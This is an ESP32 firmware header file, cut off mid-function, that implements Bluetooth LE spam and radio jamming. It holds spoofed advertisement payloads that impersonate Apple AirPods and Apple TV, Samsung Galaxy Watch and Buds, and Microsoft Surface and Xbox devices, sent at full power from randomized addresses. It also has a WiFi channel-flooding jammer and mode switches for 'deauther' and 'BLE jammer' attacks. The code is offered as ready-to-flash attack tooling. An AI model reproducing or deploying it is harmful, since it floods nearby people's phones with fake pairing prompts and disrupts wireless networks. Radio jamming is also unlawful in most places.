#pragma once
#include <WiFi.h>
#include <esp_wifi.h>

// addData(): Core 3.x nimmt String, Core 2.0.x std::string
#if ESP_ARDUINO_VERSION_MAJOR >= 3
  #define JAM_ADV_ADDDATA(adv, buf, len) (adv).addData(String((const char*)(buf), (unsigned int)(len)))
#else
  #define JAM_ADV_ADDDATA(adv, buf, len) (adv).addData(std::string((const char*)(buf), (len)))
#endif

int bleChannels[] = {1, 3, 13};
int currentChannel = 0;

uint8_t dataSurfaceKeyboard[31] = {
  0x1e, 0xff, 0x06, 0x00, 0x03, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t dataSurfaceMouse[31] = {
  0x1e, 0xff, 0x06, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t dataSurfaceHeadphones[31] = {
  0x1e, 0xff, 0x06, 0x00, 0x05, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t dataXboxController[31] = {
  0x1e, 0xff, 0x06, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t dataSurfaceEarbuds[31] = {
  0x1e, 0xff, 0x06, 0x00, 0x09, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t dataSurfaceSlimPen[31] = {
  0x1e, 0xff, 0x06, 0x00, 0x0b, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t dataSurfaceDial[31] = {
  0x1e, 0xff, 0x06, 0x00, 0x0d, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const char* ms_device_names[] = {
    "Surface Keyboard",
    "Surface Mouse",
    "Surface Arc Mouse",
    "Surface Precision Mouse",
    "Surface Headphones 2",
    "Surface Earbuds",
    "Surface Slim Pen 2",
    "Xbox Wireless Controller",
    "Xbox Elite Controller",
    "Surface Dial",
    "Microsoft Bluetooth Mouse",
    "Microsoft Modern Keyboard",
    "Surface Pro Keyboard",
    "Microsoft Ergonomic Mouse",
    "Surface Mobile Mouse"
};

const char* ms_service_uuids[] = {
    "00001124-0000-1000-8000-00805f9b34fb",
    "00001101-0000-1000-8000-00805f9b34fb",
    "0000110a-0000-1000-8000-00805f9b34fb",
    "0000110b-0000-1000-8000-00805f9b34fb",
    "0000110c-0000-1000-8000-00805f9b34fb",
    "00001112-0000-1000-8000-00805f9b34fb",
    "0000180a-0000-1000-8000-00805f9b34fb",
    "0000180f-0000-1000-8000-00805f9b34fb",
};

uint8_t* ms_payloads[] = {
    dataSurfaceKeyboard,
    dataSurfaceMouse,
    dataSurfaceHeadphones,
    dataXboxController,
    dataSurfaceEarbuds,
    dataSurfaceSlimPen,
    dataSurfaceDial
};

int currentMsIndex = 0;
unsigned long lastAdv = 0;
int delayMs = 500;
BLEAdvertising *pAdvertising2 = nullptr;

const uint8_t watch_models[] = {
  0x01, // Galaxy Watch 4
  0x02, // Galaxy Watch 4 Classic
  0x03, // Galaxy Watch 5
  0x04, // Galaxy Watch 5 Pro
  0x05, // Galaxy Watch 6
  0x06, // Galaxy Watch 6 Classic
  0x07, // Galaxy Watch 7
  0x08, // Galaxy Watch Ultra
  0x09, // Galaxy Watch FE
  0x0A, // Galaxy Watch 3
  0x0B, // Galaxy Watch Active 2
  0x0C, // Galaxy Watch Active
  0x0D, // Galaxy Watch (Original)
  0x0E, // Galaxy Watch 4 (alt color var)
  0x0F, // Galaxy Watch 5 (alt color var)
  0x10, // Galaxy Watch 6 (alt color var)
  0x11, // Galaxy Watch 7 (alt color var)
  0x12, // Galaxy Watch Ultra (alt)
  0x13, // Galaxy Watch FE (alt)
  0x14, // Galaxy Watch 4 Classic (alt)
  0x15, // Galaxy Watch 6 Classic (alt)
  0x16, // Galaxy Buds Live
  0x17, // Galaxy Buds Pro
  0x18, // Galaxy Buds 2
  0x19, // Galaxy Buds 2 Pro
};

const uint8_t SHORT_DEVICES2[][23] = {
  // Galaxy Buds Live       (0x16)
  {0x16, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16},
  // Galaxy Buds Pro        (0x17)
  {0x16, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x17},
  // Galaxy Buds 2          (0x18)
  {0x16, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18},
  // Galaxy Buds 2 Pro      (0x19)
  {0x16, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x19},
  // Galaxy Buds FE         (0x1A)
  {0x16, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A},
  // Galaxy Buds 3          (0x1B)
  {0x16, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1B},
  // Galaxy Buds 3 Pro      (0x1C)
  {0x16, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1C},
};

uint8_t dataAirpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsProGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataPowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataPowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioBuds[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioBudsPlus[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVNewUser[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVAppleIDSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVWirelessAudioSync[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVHomekitSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVKeyboard[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVConnectingToNetwork[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataHomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataSetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataTransferNumber[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataTVColorBalance[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

void initBLESpam() {
  BLEDevice::init("");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

BLEAdvertisementData getSamsungAdvertisementData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) {
    uint8_t AdvData_Raw[15];
    int i = 0;
    uint8_t model = watch_models[random(sizeof(watch_models) / sizeof(watch_models[0]))];
    AdvData_Raw[i++] = 14;
    AdvData_Raw[i++] = 0xFF;
    AdvData_Raw[i++] = 0x75;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x01;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x02;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x01;
    AdvData_Raw[i++] = 0x01;
    AdvData_Raw[i++] = 0xFF;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x43;
    AdvData_Raw[i++] = model;
    JAM_ADV_ADDDATA(oAdvertisementData, AdvData_Raw, 15);
  }
  else if (device_choice == 1) {
    JAM_ADV_ADDDATA(oAdvertisementData, SHORT_DEVICES2[device_index], 23);
  }
  else if (device_choice == 2) {
    int payload_choice = random(2);
    if (payload_choice == 0) {
      uint8_t AdvData_Raw[15];
      int i = 0;
      uint8_t model = watch_models[random(sizeof(watch_models))];
      AdvData_Raw[i++] = 14;
      AdvData_Raw[i++] = 0xFF;
      AdvData_Raw[i++] = 0x75;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x01;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x02;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x01;
      AdvData_Raw[i++] = 0x01;
      AdvData_Raw[i++] = 0xFF;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x00;
      AdvData_Raw[i++] = 0x43;
      AdvData_Raw[i++] = model;
      JAM_ADV_ADDDATA(oAdvertisementData, AdvData_Raw, 15);
    }
    else {
      int index = random(sizeof(SHORT_DEVICES2) / sizeof(SHORT_DEVICES2[0]));
      JAM_ADV_ADDDATA(oAdvertisementData, SHORT_DEVICES2[index], 23);
    }
  }
  else if (device_choice == 3) {
    uint8_t AdvData_Raw[15];
    int i = 0;
    uint8_t model = (random(2) == 0) ? 0x05 : 0x08;
    AdvData_Raw[i++] = 14;
    AdvData_Raw[i++] = 0xFF;
    AdvData_Raw[i++] = 0x75;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x01;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x02;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x01;
    AdvData_Raw[i++] = 0x01;
    AdvData_Raw[i++] = 0xFF;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x43;
    AdvData_Raw[i++] = model;
    JAM_ADV_ADDDATA(oAdvertisementData, AdvData_Raw, 15);
  }

  int adv_type_choice = random(3);
  if (adv_type_choice == 0) {
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1) {
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  return oAdvertisementData;
}

BLEAdvertisementData getAdvertismentData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) {
    JAM_ADV_ADDDATA(oAdvertisementData, DEVICES[device_index], 31);
  }
  else if (device_choice == 1) {
    JAM_ADV_ADDDATA(oAdvertisementData, SHORT_DEVICES[device_index], 23);
  }
  else if (device_choice == 2) {
    int payload_choice = random(2);
    if (payload_choice == 0) {
      int index = random(17);
      JAM_ADV_ADDDATA(oAdvertisementData, DEVICES[index], 31);
    }
    else {
      int index = random(12);
      JAM_ADV_ADDDATA(oAdvertisementData, SHORT_DEVICES[index], 23);
    }
  }
  else if (device_choice == 3) {
    int payload_choice = random(2);
    if (payload_choice == 0) {
      JAM_ADV_ADDDATA(oAdvertisementData, SHORT_DEVICES[2], 23);
    }
    else {
      JAM_ADV_ADDDATA(oAdvertisementData, SHORT_DEVICES[8], 23);
    }
  }

  int adv_type_choice = random(3);
  if (adv_type_choice == 0) {
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1) {
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  return oAdvertisementData;
}

void initBLEjam() {
  setCpuFrequencyMhz(240);
  
  WiFi.mode(WIFI_MODE_STA);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B);
  esp_wifi_init(&cfg);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_start();
  
  esp_wifi_set_max_tx_power(84);
  
  esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_1M_L);
}

void initBLESpamM() {
  setCpuFrequencyMhz(240);

  WiFi.mode(WIFI_OFF);
  WiFi.disconnect();
  delay(100);

  BLEDevice::init("Windows");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising2 = pServer->getAdvertising();

  Serial.println("[BOOT] initBLESpamM OK");
}

void randomizeMac() {
  uint8_t newMac[6];
  uint32_t rnd1 = esp_random();
  uint32_t rnd2 = esp_random();
  
  newMac[0] = (uint8_t)(rnd1 & 0xFF) | 0xC0;
  newMac[1] = (uint8_t)((rnd1 >> 8) & 0xFF);
  newMac[2] = (uint8_t)((rnd1 >> 16) & 0xFF);
  newMac[3] = (uint8_t)((rnd1 >> 24) & 0xFF);
  newMac[4] = (uint8_t)(rnd2 & 0xFF);
  newMac[5] = (uint8_t)((rnd2 >> 8) & 0xFF);
  
  esp_bd_addr_t addr;
  memcpy(addr, newMac, 6);
  pAdvertising2->setDeviceAddress(addr, BLE_ADDR_TYPE_RANDOM);
  
  Serial.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
      newMac[0], newMac[1], newMac[2], newMac[3], newMac[4], newMac[5]);
}

void sendMsSpam() {
  randomizeMac();
  int nameIndex = random(sizeof(ms_device_names) / sizeof(ms_device_names[0]));
  int payloadIndex = random(sizeof(ms_payloads) / sizeof(ms_payloads[0]));
  int uuidIndex = random(sizeof(ms_service_uuids) / sizeof(ms_service_uuids[0]));
  
  BLEAdvertisementData advData = BLEAdvertisementData();
  
  JAM_ADV_ADDDATA(advData, ms_payloads[payloadIndex], 31);
  
  advData.setName(ms_device_names[nameIndex]);
  advData.setFlags(0x06);

  int advType = random(3);
  switch(advType) {
      case 0: pAdvertising2->setAdvertisementType(ADV_TYPE_IND); break;
      case 1: pAdvertising2->setAdvertisementType(ADV_TYPE_SCAN_IND); break;
      case 2: pAdvertising2->setAdvertisementType(ADV_TYPE_NONCONN_IND); break;
  }
  
  pAdvertising2->addServiceUUID(BLEUUID(ms_service_uuids[uuidIndex]));
  
  pAdvertising2->setAdvertisementData(advData);
  pAdvertising2->setMinInterval(0x20);
  pAdvertising2->setMaxInterval(0x20);
  pAdvertising2->setMinPreferred(0x20);
  pAdvertising2->setMaxPreferred(0x20);
  
  pAdvertising2->start();
  
  Serial.printf("[MS SPAM] %-25s | Payload: %d | UUID: %d\n",
      ms_device_names[nameIndex], payloadIndex, uuidIndex);
  
  delay(delayMs);
  
  pAdvertising2->stop();
}

void IRAM_ATTR jamWiFiChannel(uint8_t wifiChannel) {
  esp_wifi_set_channel(wifiChannel, WIFI_SECOND_CHAN_NONE);
  
  esp_wifi_set_max_tx_power(84);
  
  uint8_t longPacket[256];
  longPacket[0] = 0xD0;
  longPacket[1] = 0x00;
  longPacket[2] = 0x08;
  longPacket[3] = 0x00;
  for(int i = 4; i < 28; i++) longPacket[i] = 0xFF;
  longPacket[22] = 0x00;
  longPacket[23] = 0x00;
  longPacket[24] = 0x00;
  longPacket[25] = 0x00;
  for(int i = 26; i < 256; i++) longPacket[i] = random(0, 255);
  
  for(int i = 0; i < 10000; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, longPacket, 256, false);
    delayMicroseconds(5);
  }
}

void Airpods() {
  device_choice = 0;
  device_index = 0;
  attack_state = 1;
}

void Airpods_pro() {
  device_choice = 0;
  device_index = 1;
  attack_state = 1;
}

void Airpods_Max() {
  device_choice = 0;
  device_index = 2;
  attack_state = 1;
}

void Airpods_Gen_2() {
  device_choice = 0;
  device_index = 3;
  attack_state = 1;
}

void Airpods_Gen_3() {
  device_choice = 0;
  device_index = 4;
  attack_state = 1;
}

void Airpods_Pro_Gen_2() {
  device_choice = 0;
  device_index = 5;
  attack_state = 1;
}

void Power_Beats() {
  device_choice = 0;
  device_index = 6;
  attack_state = 1;
}

void Power_Beats_Pro() {
  device_choice = 0;
  device_index = 7;
  attack_state = 1;
}

void Beats_Solo_Pro() {
  device_choice = 0;
  device_index = 8;
  attack_state = 1;
}

void Beats_Studio_Buds() {
  device_choice = 0;
  device_index = 9;
  attack_state = 1;
}

void Beats_Flex() {
  device_choice = 0;
  device_index = 10;
  attack_state = 1;
}

void Beats_X() {
  device_choice = 0;
  device_index = 11;
  attack_state = 1;
}

void Beats_Solo_3() {
  device_choice = 0;
  device_index = 12;
  attack_state = 1;
}

void Beats_Studio_3() {
  device_choice = 0;
  device_index = 13;
  attack_state = 1;
}

void Beats_Studio_Pro() {
  device_choice = 0;
  device_index = 14;
  attack_state = 1;
}

void Betas_Fit_Pro() {
  device_choice = 0;
  device_index = 15;
  
}

void Beats_Studio_Buds_Plus() {
  device_choice = 0;
  device_index = 16;
  attack_state = 1;
}

void AppleTV_Setup() {
  device_choice = 1;
  device_index = 0;
  attack_state = 1;
}

void AppleTV_Pair() {
  device_choice = 1;
  device_index = 1;
  attack_state = 1;
}

void AppleTV_New_User() {
  device_choice = 1;
  device_index = 2;
  attack_state = 1;
}

void AppleTV_AppleID_Setup() {
  device_choice = 1;
  device_index = 3;
  attack_state = 1;
}

void AppleTV_Wireless_Audio_Sync() {
  device_choice = 1;
  device_index = 4;
  attack_state = 1;
}

void AppleTV_Homekit_Setup() {
  device_choice = 1;
  device_index = 5;
  attack_state = 1;
}

void AppleTV_Keyboard_Setup() {
  device_choice = 1;
  device_index = 6;
  attack_state = 1;
}

void AppleTV_Connecting_to_Network() {
  device_choice = 1;
  device_index = 7;
  attack_state = 1;
}

void Homepod_Setup() {
  device_choice = 1;
  device_index = 8;
  attack_state = 1;
}

void Setup_New_Phone() {
  device_choice = 1;
  device_index = 9;
  attack_state = 1;
}

void Transfer_Number() {
  device_choice = 1;
  device_index = 10;
  attack_state = 1;
}

void TV_Color_Balance() {
  device_choice = 1;
  device_index = 11;
  attack_state = 1;
}

void Apple_Vision_Pro() {
  device_choice = 1;
  device_index = 12;
  attack_state = 1;
}

void Random_Attack(){
  device_choice = 2;
  attack_state = 1;
}

void Extended_Attack(){
  device_choice = 3;
  attack_state = 1;
}

void Flipper_Zero() {
  device_choice = 3;
  attack_state = 1;
  device_uuid = BLEUUID("00003082-0000-1000-8000-00805f9b34fb");
}

void PairWatchSpam() {
  int nextMode = (currentMode == 0) ? 1 : 0;
  preferences.putInt("mode", nextMode);
  preferences.putInt("idt", 1);
  preferences.end();
  delay(500);
  ESP.restart();
}

void PairApplespam() {
  int nextMode = (currentMode == 0) ? 1 : 0;
  preferences.putInt("mode", nextMode);
  preferences.putInt("idt", 2);
  preferences.end();
  delay(500);
  ESP.restart();
}

void Windowsspam() {
  preferences.putInt("mode", 1);
  preferences.putInt("idt", 5);
  preferences.end();
  delay(500);
  ESP.restart();
}

void PairAppleAirpodsspam() {
  int nextMode = (currentMode == 0) ? 1 : 0;
  preferences.putInt("mode", nextMode);
  preferences.putInt("idt", 3);
  preferences.end();
  delay(500);
  ESP.restart();
}

void Deautherspam() {
  int nextMode = (currentMode == 0) ? 1 : 0;
  preferences.putInt("mode", nextMode);
  preferences.putInt("idt", 6);
  preferences.end();
  delay(500);
  ESP.restart();
}

void BLEJammerspam() {
  int nextMode = (currentMode == 0) ? 1 : 0;
  preferences.putInt("mode", nextMode);
  preferences.putInt("idt", 4);
  preferences.end();
  delay(500);
  ESP.restart();
}

void SamsungWatchSpam() {
  device_choice = 0;
